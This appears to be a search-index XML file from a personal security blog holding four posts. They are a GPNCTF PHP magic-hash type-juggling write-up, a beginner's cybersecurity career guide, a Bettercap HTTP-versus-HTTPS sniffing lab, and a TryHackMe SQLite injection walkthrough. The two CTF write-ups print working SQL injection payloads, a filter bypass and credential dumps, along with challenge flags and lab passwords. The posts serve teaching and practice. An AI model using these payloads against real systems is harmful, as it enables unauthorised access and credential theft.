@@ -1,0 +1,424 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Free-Flagging – GPNCTF 2025 Writeup</title>
+    <url>/GPNCTF-Free-Flagging/</url>
+    <content><![CDATA[Free Flagging
+A small PHP challenge with a sneaky bug that can be defeated with just one line of magic. In this blog post, I’m sharing how I solved the Free-Flagging CTF challenge from GPNCTF 2025.
+
+
+Challenge SummaryThis was a web challenge from GPNCTF 2025 called Free-Flagging.
+We were given: 
+Spawn challenge instancencat –ssl free-flagging.gpn23.ctf.kitctf.de 443
+
+As you can see it provides url that led to a PHP web application:-https://stormwood-of-unstoppable-commerce.gpn23.ctf.kitctf.de
+When I visited the URL, if I didn’t send a POST request, the server would just show me its source code. It’s like opening the program and seeing exactly how it works.
+
+The Source Codeif ($_SERVER[&#x27;REQUEST_METHOD&#x27;] !== &#x27;POST&#x27;) &#123;    highlight_file(__FILE__);    exit;&#125;$flag = getenv(&quot;FLAG&quot;);$guess = file_get_contents(&#x27;php://input&#x27;);if (md5($flag) == md5($guess)) &#123;    echo(&quot;You correctly guessed the flag - &quot; . $flag);&#125; else &#123;    echo(&quot;You guessed wrong: The flags hash is &quot; . md5($flag) . &quot; and the hash of your guess is &quot; . md5($guess));&#125; 
+
+
+
+What Is This Code Doing?
+When you visit the page normally (GET request): The server shows the source code of the file, like if you were reading the code behind a webpage.
+
+When you send a POST request with a guess: The server compares your guess with the flag using md5() (a type of hash function).
+
+
+
+If your guess matches the flag’s hash, it gives you the flag.
+If your guess doesn’t match, it shows you the hash of the flag and your guess.
+
+Seems secure, right but not really guys…
+
+The Bug – PHP Type Juggling
+PHP has a weird behavior when comparing values using &#x3D;&#x3D; (double equals). It doesn’t always check if things are exactly the same. If two values look like numbers, PHP might convert them into numbers before comparing them. This is called type juggling.
+
+
+Why is this dangerous?PHP doesn’t always compare things the way we expect. It might treat strings that look like numbers (even if they’re not) as actual numbers.
+Here’s the scary part:
+&quot;0e1234&quot; == &quot;0e5678&quot;
+
+Both 0e1234 and 0e5678 are actually numbers in scientific notation:
+
+0e1234 means 0 * 10^1234
+0e5678 means 0 * 10^5678
+
+Both are treated as 0. So PHP thinks they’re the same even though they’re different!
+
+Magic Hash ExampleNow let’s talk about magic hashes. MD5 is a type of hash function that turns a string into a fixed-size value. In this challenge, we are comparing two MD5 hashes.
+Consider this string QNKCDZO. When we run it through the MD5 hash function, it gives us:
+md5(&quot;QNKCDZO&quot;) = 0e830400451993494058024219903391
+Notice how it starts with 0e followed by numbers? That’s a magic hash. It looks like scientific notation (i.e., a number), which is dangerous in PHP because of the way PHP handles type comparison.
+If the real flag’s hash looks like this:
+md5($flag) = 0e12345678901234567890
+
+Then PHP compares these two like this:
+md5($flag) == md5(&quot;QNKCDZO&quot;)  → TRUE 
+PHP thinks both hashes are the same because they both start with 0e. This means the hashes are not the same, but PHP wrongly says they are equal!
+
+The Exploit (One-Line Win)I sent the magic hash string (QNKCDZO) to the server using a simple POST request.
+curl -X POST https://stormwood-of-unstoppable-commerce.gpn23.ctf.kitctf.de -d &#x27;QNKCDZO&#x27;
+The server saw QNKCDZO, hashed it, and then compared the hashes. Because of the magic hash bug, PHP thought my guess was the correct flag and it worked!
+Flag: GPNCTF&#123;just_php_d01ng_php_th1ng5_abM2zz&#125;
+
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>PHP</tag>
+        <tag>GPNCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>How to Start in Cybersecurity – For Absolute Beginners</title>
+    <url>/How-to-Start-in-Cybersecurity/</url>
+    <content><![CDATA[Start Your Cybersecurity Journey
+My name is Aawart KC and I’m from Nepal 🇳🇵. I’m writing this blog to help anyone who wants to start learning cybersecurity. 
+If you’re confused and don’t know where to begin, you’re not alone. I was in the same spot too. But the good news is you don’t need to be a genius to start. You just need to be curious and consistent.
+Cybersecurity is not just about “hacking” it’s a huge field. This blog will help you understand where to start, what to learn, and how to keep going.
+
+What part of cybersecurity actually excites you?That’s the first question you need to ask yourself. There are different areas in cybersecurity. If you know what excites you, learning becomes much easier and more fun.
+
+Step 1: Understand the 3 Main Cybersecurity Paths🔴 Red Team – Break In (Offensive Security)Red Teamers are ethical hackers. They try to break into systems and websites just like real attackers but legally, to help organizations become safer.
+Skills:  
+
+Exploiting bugs, reverse engineering, scripting and many more.
+
+Tools:  
+
+Nmap (network scanning)  
+Burp Suite (website testing)  
+Gobuster (hidden files)  
+SQLmap (SQL injection)  
+ZAP Proxy (web attacks)
+
+For you if you like breaking stuff, solving puzzles, or CTFs.
+
+Don’t worry about the tools. You’ll slowly learn what each one does and when to use them. Just start exploring!
+
+Note:In Red Team, there are many different roles, but all of them focus on attacking or finding weaknesses in systems to help improve security.
+
+🔵 Blue Team – Defend (Defensive Security)Blue Teamers defend systems. They watch over servers, detect hackers, and respond quickly to attacks. They are the protectors who keep organizations safe.
+Skills:  
+
+Log analysis, SIEM, incident response, monitoring networks.
+
+Tools:  
+
+Wireshark (traffic analysis)  
+Splunk (log monitoring)   
+ZAP Proxy (testing security, from defender’s view)
+
+If you enjoy protecting systems and working as part of a team, this path could be perfect for you.
+
+Don’t worry about the tools right now. You’ll learn what they do and how to use them step by step as you go.
+
+Note:In Blue Team, there are many roles but all of them focus on defending like monitoring, detecting, and responding to threats to keep systems safe.
+
+🟢 GRC – Policy &amp; ComplianceGRC stands for Governance, Risk, and Compliance. These people don’t hack or code much, but they are very important. They make rules and security policies and ensure the company is safe, legal and running smoothly.
+Skills:  
+
+Writing policies, risk assessment, planning.
+
+Tools:  
+
+Excel (yes, a lot!)  
+ISO 27001, NIST CSF tools  
+Dashboards for managing audits  
+ZAP Proxy (for checking compliance in apps)
+
+For you if you enjoy organizing, planning, and writing, this path might suit you well.
+
+Don’t worry if this sounds new. You’ll learn how these tools and processes work step by step if you start researching, watch video and more.
+
+Are There Only 3 Paths?Not really, these 3 are a great way to start, but there are more roles too, like:
+
+Purple Team – Bridge between Red &amp; Blue
+Threat Intelligence – Tracking hacker groups
+Digital Forensics (DFIR) – Investigating attacks
+Security Awareness – Teaching users about safety
+Security Engineering – Building secure systems
+
+
+But don’t worry about these now just focus on Red, Blue, or GRC first. You’ll discover more as you learn.
+
+
+Step 2: Start the Journey (What To Do)Here’s a beginner-friendly roadmap:
+
+1. Pick a Path: Red, Blue, or GRCTo find out which cybersecurity path is best for you, do some research first.  
+Watch YouTube videos and read articles about each path to understand what they do.  
+Try searching for:  
+
+“Red Team vs Blue Team vs GRC”  
+“Cybersecurity roles explained”
+
+This will help you know which path fits your interests and skills the most.
+
+Remember:Research and explore each option so you can choose the best path for you.
+
+
+2. Learn LinuxLinux is used everywhere in cybersecurity. Learn simple commands first.
+Here’s a free course:🔗 TryHackMe - Linux Fundamentals Part 1
+You can try these commands for practice:
+pwd       # Show current locationls        # List filescd        # Change directorymkdir     # Make folderrm        # Delete file/foldercat         # Show file contentnano        # Simple text editorchmod       # Change permissionsping        # Test network connection
+
+YouTube Recommendations:
+Linux for Hackers - NetworkChuck
+Linux Basics - The Cyber Mentor
+
+
+Tip:You don’t need to focus too hard — you’ll learn Linux naturally over time.Just like how we slowly learned to use Windows by using it every day, you’ll get used to Linux the same way. Try a few commands daily and explore bit by bit!
+
+
+3. Learn Basics: Networking &amp; ScriptingBefore diving deep, understand the fundamentals. These will help you later with everything — whether it’s hacking or defending.
+Start by learning these questions:
+
+What is an IP address?  
+What is DNS?  
+What is HTTP, HTTPS, SSH?  
+What is a port? Types of ports?  
+URL structure and status codes (e.g., 200, 404)  
+HTTP methods (GET, POST, etc.)  
+How websites actually work  
+What is a firewall?  
+Learn the Cyber Kill Chain (attacker steps)
+
+Also, try to write simple scripts in:
+
+Python  
+Bash
+
+
+4. Get Hands-On ExperienceOnce you have a basic understanding, it’s time to practice. There are many platforms, but I personally recommend starting with:
+
+🔗 TryHackMe  
+🔗 Hack The Box
+
+These platforms let you practice cybersecurity skills in real virtual labs.
+
+5. Start Using ToolsStart slowly with tools made for beginners. Learn what the tools do and why we use them.
+🔴 Red Team (Attacking):
+Nmap – Network scanner  
+Burp Suite – Web testing  
+SQLMap – Database injection testing  
+ZAP Proxy – Web attack analyzer  
+Gobuster – Find hidden pages&#x2F;files
+
+🔵 Blue Team (Defending):
+Wireshark – Analyze network traffic  
+Splunk – Log management and monitoring  
+ELK Stack – Logging and alerting  
+OSQuery – System monitoring  
+ZAP Proxy – Used for learning how attacks work (from a defender’s view)
+
+🟢 GRC (Policy &amp; Compliance):
+Learn to write security policies  
+Study ISO 27001 and NIST frameworks  
+Practice Risk Management  
+Use Excel and compliance dashboards  
+Try ZAP to check apps against policy requirements
+
+
+6. Join the Cybersecurity CommunityThis is very important and many beginners skip it.
+Join forums, Discord servers, Reddit subs, or Telegram groups.Ask questions, share your progress, and stay updated.
+You’ll learn faster and feel less alone.
+
+7. Build Projects &#x2F; Share Your WorkThis step makes you stand out. Start a GitHub or a blog. Share:
+
+CTF writeups
+Tools you tried
+Notes from what you learned
+Scripts you wrote
+
+Example: blog.aawart.com.npThis is how I’m doing it!
+
+Even if you’re a beginner — share what you learn. It shows your growth.
+
+
+Final WordsIf you’re feeling lost, that’s totally okay. Everyone starts that way.
+
+Give yourself just 3 months.Try something new each week.Watch a video, write a script, solve a challenge, or talk to someone in the field.
+
+And most importantly…
+Don’t quit. You WILL get better.Everything becomes easier once you start doing.
+
+I promise — if you stay curious, this journey will be one of the most exciting things you’ll ever do.
+
+
+Need Help? I’m Here!You can always reach out to me. I’ll try my best to help:
+
+LinkedIn  
+Email: aawart2005@gmail.com  
+Instagram: @aawart.kc
+
+I’ll answer every question, no matter how small.
+I’m also a beginner and still learning.I wrote this guide because I was once confused too, and I don’t want you to feel the same way.
+Let’s learn and grow together. Just message me anytime.
+]]></content>
+      <categories>
+        <category>Cybersecurity</category>
+      </categories>
+      <tags>
+        <tag>Cybersecurity</tag>
+        <tag>Guide</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP vs HTTPS: What Network Sniffers Can Really See</title>
+    <url>/Network_sniffing/</url>
+    <content><![CDATA[Have you ever wondered what someone on the same network could actually see when you’re browsing the web? You’ve probably heard that “HTTP is unsafe” and that “HTTPS keeps you secure,” but it still exposes some metadata. Have you ever really seen this in action?
+In this blog, I’ll show you exactly what an on-network observer can capture. Using a small, ethical lab with Bettercap, I explored what’s visible when visiting websites from my own devices (a Kali VM as the attacker and my Windows PC as the victim) on a completely isolated network. You might be surprised at what can be seen, even without breaking any laws.
+
+Understanding packet sniffingPacket sniffing is the practice of observing network traffic to learn about devices and their communication. When traffic is unencrypted, it is possible to see the exact data exchanged. When traffic is encrypted, you can still see some metadata such as which websites or services are being contacted. Packet sniffing is a key concept in understanding network security and privacy.
+
+Tools used (Bettercap-focused)
+Bettercap: used to discover hosts and observe network level metadata from an attacker perspective.  
+
+My Windows PC: used as the test victim.
+
+
+
+Note: this post intentionally does not publish commands or scripts to intercept traffic on networks you do not own. If you want detailed lab notes for private study, contact me for sanitized access.
+
+
+Project workflow
+I ran Bettercap on the attacker machine and open the help menu, you will see multiple modules. For this demo I focused on three high-level modules:
+
+
+net.probe: host discovery on the subnet (lists IPs and vendor info of devices on the local network).  
+
+arp.spoof: a module that can enable a Man-in-the-Middle scenario in a controlled lab to show how traffic might be hijacked. 
+
+net.sniff: captures packets and extracts application layer metadata.
+
+
+
+ObservationsDuring the lab, I tested both HTTP and HTTPS websites to see what Bettercap can capture.
+
+HTTP Example:I visited http://testasp.vulnweb.com/ and went to the login page using:  
+
+Username: test  
+Password: test
+
+Bettercap captured exactly what I typed in the login form, including the username and password.This clearly demonstrates that HTTP traffic is not encrypted and everything is visible to an on network observer.
+Image: Bettercap captured username and password on HTTP site.
+
+HTTPS Example:I visited https://aawart.com.np.Bettercap could not see the login credentials or page content, but it still detected metadata:  
+
+TLS SNI: shows the domain aawart.com.np  
+mDNS traffic: background protocol traffic that may appear in the capture
+
+Image: Bettercap shows domain accessed via TLS SNI.
+
+
+
+Key Takeaways
+HTTP is dangerous: Everything is sent in plaintext. Usernames, passwords and page content can be captured by anyone on the same network.  
+HTTPS is safer but not perfect: While login credentials and content are encrypted, metadata like the domain name (via TLS SNI) is still visible.  
+Public Wi-Fi is risky: Any untrusted network can allow attackers to sniff traffic and steal sensitive information if sites are HTTP.  
+Filtering helps: When analyzing captures, filtering out background protocols (mDNS, SSDP, etc.) improves clarity and focuses on meaningful activity.  
+Ethics matter: Experiments should only be run on networks and devices you own or have explicit permission to use. Unauthorized interception is illegal.
+
+
+ConclusionThis lab demonstrates how network traffic can be observed safely for educational purposes. Key lessons:  
+
+Never use HTTP for sensitive activity on public or untrusted networks.  
+Always prefer HTTPS to protect credentials and data, but remember that some metadata like visited domains is still visible.  
+Understanding network security helps protect against attackers, especially on shared networks like coffee shop Wi-Fi or airports.
+
+For anyone interested in a deeper look at this lab, I can share sanitized lab notes or a private demo under controlled access.
+]]></content>
+      <categories>
+        <category>Network security</category>
+      </categories>
+      <tags>
+        <tag>Bettercap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>TryHackMe Light Full Walkthrough &amp; SQL Injection Exploit</title>
+    <url>/TryHackMe-light-challenge/</url>
+    <content><![CDATA[A beginner-friendly challenge focused on SQL Injection in SQLite.
+
+Challenge SetupWhile connecting to the machine on port 1337 using nc, we’re welcomed with a login prompt:
+nc 10.10.39.206 1337
+
+Output:
+Welcome to the Light database!Please enter your username:
+
+Testing for SQL InjectionI started with classic test inputs:
+Please enter your username: smokeyPassword: vYQ5ngPpw8AdUmL
+
+Then:
+Please enter your username: adminUsername not found.
+
+Trying a single quote:
+Please enter your username: &#x27;Error: unrecognized token: &quot;&#x27;&#x27;&#x27; LIMIT 30&quot;
+
+This error confirms that SQL queries are constructed, unsafely allowing SQL Injection.
+
+Understanding the Query StructureUsing inputs like:
+Please enter your username: smokey&#x27; &#x27;Error: near &quot;&#x27;&#x27;&quot;: syntax error
+
+Suggested the query could look like:
+SELECT password FROM users WHERE username = &#x27;.....&#x27; LIMIT 30;
+Tried some filtering tests:
+Please enter your username: smokey&#x27; --
+
+Response:
+For strange reasons I can&#x27;t explain, any input containing /*, -- or, %0b is not allowed :)
+
+So characters like –, &#x2F;*, and %0b are filtered. Time to get creative!
+
+Bypassing Filters &amp; Identifying the Database TypeI first assumed MySQL and tried:
+&#x27; UNION SELECT @@version
+
+But got:
+Error: unrecognized token: &quot;@&quot;
+
+Tried PostgreSQL and other DBMS payloads but no success. Then I try:
+Please enter your username: &#x27; Union Select sqlite_version()&#x27;Password: 3.31.1
+
+Boom! Two key takeaways:
+
+Backend is SQLite
+SQLi works even without comments
+
+
+Extracting Tables &amp; DataTo enumerate tables:
+Please enter your username: &#x27; Union Select name FROM sqlite_master&#x27;Password: admintable
+
+Found a table: admintable.
+To dump credentials:
+Please enter your username: &#x27; Union Select username || &#x27;~&#x27; || password from admintable&#x27;Password: TryHackMeAdmin~mamZtAuMlrsEy5bp6q17
+
+To retrieve the flag:
+Please enter your username: &#x27; Union Select password from admintable&#x27;Password: THM&#123;SQLit3_InJ3cTion_is_SimplE_nO?&#125;
+
+
+Why Two Different “Password” Outputs?In this payload:
+&#x27; Union Select username || &#x27;~&#x27; || password from admintable&#x27;
+
+The || operator concatenates username and password with ~
+Result: TryHackMeAdmin~mamZtAuMlrsEy5bp6q17
+But here:
+&#x27; Union Select password from admintable&#x27;
+
+You’re fetching just the password column which contains the actual flag.
+
+Challenge Answers
+Admin username: TryHackMeAdmin
+Password: mamZtAuMlrsEy5bp6q17
+Flag: THM&#123;SQLit3_InJ3cTion_is_SimplE_nO?&#125;
+
+]]></content>
+      <categories>
+        <category>SQLi</category>
+      </categories>
+      <tags>
+        <tag>SQLi</tag>
+      </tags>
+  </entry>
+</search>
